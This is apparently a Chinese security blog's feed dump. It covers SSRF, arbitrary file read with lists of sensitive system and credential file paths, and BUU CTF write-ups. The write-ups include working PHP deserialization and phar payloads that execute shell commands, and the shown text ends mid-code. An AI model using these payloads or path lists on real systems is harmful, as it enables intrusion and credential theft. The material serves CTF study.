⒲ ⒳ ⒴ ⒵ </span><br><span class="line">Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ </span><br><span class="line">ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ </span><br><span class="line">⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ </span><br><span class="line">⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</span><br></pre></td></tr></table></figure><h4 id="xip-io"><a href="#xip-io" class="headerlink" title="xip.io"></a>xip.io</h4><p><img src="/../images/image-20230603222133775.png" alt="image-20230603222133775"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>![屏幕截图 2023-03-22 101713](..&#x2F;images&#x2F;屏幕截图 2023-03-22 101713.png)</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.wangan.com/articles/1238#59315b">https://www.wangan.com/articles/1238#59315b</a></p><p><a href="https://zhuanlan.zhihu.com/p/112055947">https://zhuanlan.zhihu.com/p/112055947</a></p><p><a href="https://joychou.org/web/phpssrf.html#directory0811578052187574410">https://joychou.org/web/phpssrf.html#directory0811578052187574410</a></p><p><a href="https://www.sqlsec.com/2021/05/ssrf.html">https://www.sqlsec.com/2021/05/ssrf.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>任意文件读取和下载</title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E4%B8%8B%E8%BD%BD/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>一些网站由于业务需要，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，攻击者就能够通过回溯符<code>../</code>或<code>绝对路径</code>跳转到任意目录查看或下载任意的文件；这可能是代码源文件，敏感配置文件等等，在特定的场景下，还可能造成SSRF漏洞。</p><h1 id="常见场景"><a href="#常见场景" class="headerlink" title="常见场景"></a>常见场景</h1><p><img src="/../images/qcLDlsYeCB1V6EK.png" alt="image-20220112103936559"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>读取</p><ul><li>网站源码</li><li>配置文件</li></ul><table><thead><tr><th align="center">中间件</th><th align="center">配置 文件目录</th><th align="center">主配置文件</th><th align="center">网站目录</th><th align="center">日志目录</th></tr></thead><tbody><tr><td align="center">nginx</td><td align="center">&#x2F;etc&#x2F;nginx&#x2F;</td><td align="center">nginx.conf</td><td align="center">&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;</td><td align="center">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;</td></tr><tr><td align="center">apache</td><td align="center">&#x2F;etc&#x2F;apache2&#x2F;</td><td align="center">apache2.conf</td><td align="center">&#x2F;var&#x2F;www&#x2F;html&#x2F;</td><td align="center">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;</td></tr><tr><td align="center">tomcat</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf</td><td align="center">如下图</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;log</td></tr></tbody></table><p><img src="/../images/image-20230301144917539-1686983536199.png" alt="image-20230301144917539"></p><ul><li><p>java站点</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/web.xml</span><br><span class="line">/WEB-INF/classes/applicationContext.xml</span><br><span class="line">/WEB-INF/classes/xxx/xxx/xxx.class</span><br><span class="line">core.jar</span><br></pre></td></tr></table></figure><blockquote><p>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell</p></blockquote></li><li><p>tomcat</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/tomcat/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure></li><li><p>nginx</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www/nginx/conf/nginx.conf</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/usr/local/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure></li><li><p>apache</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br></pre></td></tr></table></figure></li><li><p>redis<br><code>/etc/redis.conf</code></p></li><li><p>ssh<br><code>/etc/ssh/sshd_config</code></p></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="x2F-etc-系统配置文件目录"><a href="#x2F-etc-系统配置文件目录" class="headerlink" title="&#x2F;etc 系统配置文件目录"></a><strong>&#x2F;etc 系统配置文件目录</strong></h4><ul><li><p>&#x2F;etc&#x2F;passwd</p><p>记录用户信息</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">tcpdump:x:72:72::/:/sbin/nologin</span><br><span class="line">....</span><br><span class="line">允许登入的shell就是/bin/bash禁止shell登入就是/sbin/nologin</span><br></pre></td></tr></table></figure><ul><li><p>格式解析</p><p>以:作为分隔符<br>登录名:加密的口令:UID:GID:用户信息:用户目录:用户登陆后使用的shell</p></li><li><p>为什么有些登录名是服务进程名？</p><blockquote><p>Linux系统会为各种各样的功能创建不同的用户账户，而这些账户并不是真的用户。</p><p>这些账户叫作系统账户，是系统上运行的各种服务进程访问资源用的特殊账户。</p><p>比如上述的ftp，tcpdump。</p></blockquote></li><li><p>为什么要这样做？</p><blockquote><p>在安全成为一个大问题之前，这些服务经常会用root账户登录。遗憾的是，如果有非授权的用户攻陷了这些服务中的一个，他立刻就能作为root用户进入系统。为了防止发生这种情况，现在运行在Linux服务器后台的几乎所有的服务都是用自己的账户登录。这样的话，即使有人攻入了某个服务，也无法访问整个系统。</p></blockquote></li><li><p>为什么密码都是X</p><blockquote><p>鉴于很多程序都需要访问etc&#x2F;passwd文件获取用户信息，这就成了一个安全隐患。</p><p>绝大多数Linux系统都将用户密码保存在另一个单独的文件中（叫作shadow文件，位置</p><p>在&#x2F;etc&#x2F;shadow）。只有特定的程序（比如登录程序）才能访问这个文件</p></blockquote></li></ul></li><li><p>&#x2F;etc&#x2F;shadow</p><blockquote><p>&#x2F;etc&#x2F;shadow文件对Linux系统密码管理提供了更多的控制。只有root用户才能访问&#x2F;etc&#x2F;shadow</p><p>文件，这让它比起&#x2F;etc&#x2F;passwd安全许多。</p></blockquote></li><li><p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>mac地址</p></li></ul><h4 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h4><p>文件内容解释<a href="https://blog.csdn.net/weichanghu_/article/details/80073959">https://blog.csdn.net/weichanghu_/article/details/80073959</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/hosts：记录本机的或其他主机的ip及其对应主机名</span><br><span class="line">/proc/net/arp：记录主机ip和mac？（arp协议）</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/dev</span><br><span class="line">/proc/net/fib_trie</span><br></pre></td></tr></table></figure><h4 id="命令历史操作"><a href="#命令历史操作" class="headerlink" title="命令历史操作"></a>命令历史操作</h4><p><a href="https://blog.csdn.net/u011479200/article/details/86501366">Linux| 用户目录下三个bash文件的作用(.bash_history,.bash_logout,.bash_profile,.bashrc)_YvesHe的博客-CSDN博客_bash_history</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/用户名/.bash_history： 保存了当前用户使用过的历史命令</span><br></pre></td></tr></table></figure><blockquote><p>命令历史记录被保存在隐藏文件.bash_history中，它位于用户的主目录中。</p><p>这里要注意的是，bash命令的历史记录是先存放在内存中，当shell退出时才被写入到历史文件中。</p></blockquote><p>root用户可以通过<code>history</code>命令查看</p><p><img src="/../images/image-20220923180951946-1686983536198.png" alt="image-20220923180951946"></p><h4 id="x2F-proc目录"><a href="#x2F-proc目录" class="headerlink" title="&#x2F;proc目录"></a>&#x2F;proc目录</h4><blockquote><p>&#x2F;proc 是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/proc/self/cmdline</span><br><span class="line">/proc/self/cwd</span><br><span class="line">/proc/self/exe</span><br><span class="line">/proc/self/environ</span><br><span class="line">/proc/self/mounts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">爆破</span></span><br><span class="line">/proc/pid/fd</span><br><span class="line">/proc/?/fd  # 使用通配符匹配</span><br></pre></td></tr></table></figure><h5 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h5><blockquote><ol><li><strong>在 linux 系统中如果一个程序用open()打开了一个文件但最终没有关闭他，即便从外部（如os.remove(SECRET_FILE)）删除这个文件之后，在 &#x2F;proc 这个进程的 pid 目录下的 fd 文件描述符目录下还是会有这个文件的文件描述符，通过这个文件描述符我们即可得到被删除文件的内容。</strong></li><li><strong><code>/proc/self</code>在使用时，我们是不能通过命令的方式执行通过cat命令读取cmdline的，因为如果是cat读取&#x2F;proc&#x2F;self&#x2F;cmdline的话，得到的是cat进程的信息，所以我们要通过题目的当前进程使用读取文件（如文件包含漏洞，或者SSTI使用file模块读取文件）的方式读取&#x2F;proc&#x2F;self&#x2F;cmdline。</strong></li></ol></blockquote><h1 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h1><ol><li>在配置文件中限制访问的文件目录</li><li>检查用户输入，过滤或转义含有<code>../</code>、<code>..\</code>、<code>%00</code>，<code>..</code>，<code>./</code>，<code>#</code>等跳转目录或字符终止符、截断字符的输入</li><li>严格过滤用户输入字符的合法性，比如文件类型、文件地址、文件内容等</li><li>白名单限定访问文件的目录、路径、名称</li><li>白名单限定访问文件的后缀如jpg、gif、png、rar、zip、pdf、doc、xls、ppt等</li></ol>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>BUU</title>
      <link href="/2023/05/31/BUU/"/>
      <url>/2023/05/31/BUU/</url>
      
        <content type="html"><![CDATA[<h1 id="2022-10月赛"><a href="#2022-10月赛" class="headerlink" title="2022.10月赛"></a>2022.10月赛</h1><h2 id="EasyPOP"><a href="#EasyPOP" class="headerlink" title="EasyPOP"></a>EasyPOP</h2><p>pop链</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">sorry::_destruct() ---&gt;  show::_tostring()  ---&gt;  secret_code::call ---&gt;  secret_code::show() ---&gt;  sorry::_get() </span><br><span class="line">---&gt;  fine::__invoke()</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发invoke&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;cmd:<span class="subst">$this</span>-&gt;cmd,content:<span class="subst">$this</span>-&gt;content&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发wakeup&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Go listen to Jay Chou&#x27;s secret-code! Really nice&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ctf</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发tostring&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;ctf-&gt;<span class="title function_ invoke__">show</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sorry</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发get&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="variable">$name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发destruct&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;password == <span class="variable language_">$this</span>-&gt;name) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;hint;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;name = <span class="string">&quot;jay&quot;</span>) &#123;</span><br><span class="line">            secret_code::<span class="title function_ invoke__">secret</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;This is our code&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">secret_code</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发call&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$num</span> = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$num</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发show&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;code-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$sor</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title function_ invoke__">show</span>();</span><br><span class="line"><span class="variable">$secret</span> = <span class="keyword">new</span> <span class="title function_ invoke__">secret_code</span>();</span><br><span class="line"><span class="variable">$sor1</span> = <span class="keyword">new</span> <span class="title function_ invoke__">sorry</span>();</span><br><span class="line"><span class="variable">$fine</span> = <span class="keyword">new</span> <span class="title function_ invoke__">fine</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$sor</span>-&gt;hint = <span class="variable">$show</span>;</span><br><span class="line"><span class="variable">$show</span>-&gt;ctf = <span class="variable">$secret</span>;</span><br><span class="line"><span class="variable">$secret</span>-&gt;code = <span class="variable">$sor1</span>;</span><br><span class="line"><span class="variable">$sor1</span>-&gt;key = <span class="variable">$fine</span>;</span><br><span class="line"><span class="variable">$fine</span>-&gt;cmd = <span class="string">&quot;system&quot;</span>;</span><br><span class="line"><span class="variable">$fine</span>-&gt;content = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$sor</span>);<span class="comment">#更改fine属性绕过wakeup</span></span><br><span class="line"><span class="variable">$a</span> =<span class="title function_ invoke__">serialize</span>(<span class="variable">$sor</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="hade-waibo–复现"><a href="#hade-waibo–复现" class="headerlink" title="hade_waibo–复现"></a>hade_waibo–复现</h2><p>cancanneed 存在任意文件读取漏洞</p><p>获得index.php,file.php,class.php源码</p><p>审计class.php的内容，很容易可以知道这是phar反序列化+RCE。</p><p>需要绕过wakeup和正则。</p><p>wakeup是想用常规的属性个数绕过，但是不行，然后正则想不出来。。</p><hr><p>然后看了大佬们的wp后知道，在这道题的php版本下<code>用常规的属性个数绕过</code>是无效的。</p><p>有两个思路</p><ol><li><p>师傅博客：<a href="https://blog.csdn.net/trytowritecode/article/details/127513176">https://blog.csdn.net/trytowritecode/article/details/127513176</a></p><blockquote><p>总结：</p><p>先上传一个内容为</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh  (这里师傅写的是/bash，但是我测试时是不可以的，/sh是可以的)</span></span><br><span class="line">ls /</span><br></pre></td></tr></table></figure><p>的文件，然后重新登录一个名为<code>. ./*</code>的用户上传phar文件，触发反序列化覆盖Test-&gt;$value的值为<code>. ./*</code>,从而执行<code>system(&#39;. ./*&#39;)</code>,实际上是<code>ls /</code></p></blockquote><p>原理如下</p><p>shell中<code>./*</code>会将目录下的按字典排序的第一个文件当作shell脚本执行.</p><p><img src="/../images/image-20221027144023202-1687419303717.png" alt="image-20221027144023202"></p><p>解题</p><p><strong>绕过Test::wakeup，使得Test-&gt;value的值为我们想要的。</strong></p><p>这里涉及到了一个知识点</p><blockquote><p>在php里&amp;相当于两个变量都指向同一个地址，修改一个会影响到另一个。</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="variable">$a</span> = &amp;<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> =<span class="number">2</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;$b:&#x27;</span>.<span class="variable">$b</span>.<span class="string">&#x27;$a:&#x27;</span>.<span class="variable">$a</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20221026153815014-1687419303718.png" alt="image-20221026153815014"></p><p>所以我们就需要找到一个可控变量，然后让<code>Test-&gt;value =  &amp;变量</code>，这样<code>Test-&gt;value</code>就是可控的了。</p><p>在User::wakeup中</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;username = <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br></pre></td></tr></table></figure><p>所以我们可以通过登录时的用户名来控制<code>Test-&gt;value</code>的值。</p><p>这里贴上师傅的payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//$b-&gt;username=new Test(); 这个不需要</span></span><br><span class="line"><span class="comment">//同时反序列化User和Test类</span></span><br><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br><span class="line"></span><br><span class="line"><span class="comment">//unlink(&quot;SKI12.phar&quot;);</span></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;SKI12.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里还要注意</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$b</span>-&gt;test=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;value=&amp;<span class="variable">$b</span>-&gt;username;</span><br></pre></td></tr></table></figure><p>结果是Test类先完成反序列化，User类后完成反序列化，这样才能够绕过Test::wakeup.</p><p>然后按照上面总结的步骤就可以了。</p><p>贴上我复现成功的图</p><p><img src="/../images/image-20221027150538141-1687419303719.png" alt="image-20221027150538141"></p></li><li><p>官方wp</p><blockquote><p>总结：先写入一个文件名为cat的文件，再利用phar反序列化覆盖<code>Test-&gt;$value</code>的值为<code>* /*</code>，从而执行<code>system(&#39;* /*&#39;)</code>,实际上是<code>cat /*</code></p></blockquote><p>原理如下</p><p>shell中单独一个<code>*</code>会将目录下的文件名按照字典排序拼接成命令，第一个文件名作为命令，其他文件名作为命令参数。</p><p><img src="/../images/image-20221017102117317-1687419303719.png" alt="image-20221017102117317"></p><ul><li>写入文件</li></ul><p>用户名为数组绕过User::destruct中的弱比较，从而绕过User::wakeup，同时触发Test::tostring类，从而写入文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 用户名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 弱比较</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;username == <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">User-&gt;username = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br></pre></td></tr></table></figure><ul><li><p>执行命令</p><p>与上一个思路一致。</p></li></ul></li></ol><p>非预期解</p><p>直接读取根目录下的start.sh。。。</p><h2 id="EasyLove–复现"><a href="#EasyLove–复现" class="headerlink" title="EasyLove–复现"></a>EasyLove–复现</h2><p>原生类SoapClient发送SSRF请求+CRLF漏洞+redis漏洞</p><p>访问hint.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hint</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hint</span> = <span class="string">&#x27;php://filter/read=convert.base64-encode/resource=/var/www/html/&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$hint</span> = <span class="keyword">new</span> <span class="title function_ invoke__">hint</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$hint</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$hint</span> = <span class="string">&quot;My favorite database is Redis and My favorite day is 20220311&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>知道密码的redis</p><p>审计代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">newnewnew</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love = <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">wllm</span>(<span class="variable">$this</span>-&gt;arsenetang,<span class="variable">$this</span>-&gt;l61q4cheng);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;love-&gt;<span class="title function_ invoke__">getflag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">newnewnew</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">flag</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>new了一个类，并且调用了这个类的getflag()方法，再加上是redis，很明显是SoapClient类。</p><p>payload</p><blockquote><p>低版本的Redis会将http请求的请求头内容作为redis命令解析</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span 